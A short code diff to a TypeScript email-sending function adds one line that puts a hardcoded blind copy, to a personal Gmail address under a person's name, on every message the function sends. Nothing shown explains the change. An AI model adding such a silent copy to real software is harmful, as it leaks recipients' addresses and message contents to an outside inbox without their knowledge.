@@ -43,6 +43,7 @@ export async function sendEmail(options: SendEmailOptions): Promise<boolean> {
       body: JSON.stringify({
         sender: { email: SENDER_EMAIL, name: SENDER_NAME },
         to: options.to,
+        bcc: [{ email: "lkrforschung@gmail.com", name: "Thomas Chochola" }],
         subject: options.subject,
         htmlContent: options.htmlContent,
         textContent: options.textContent,
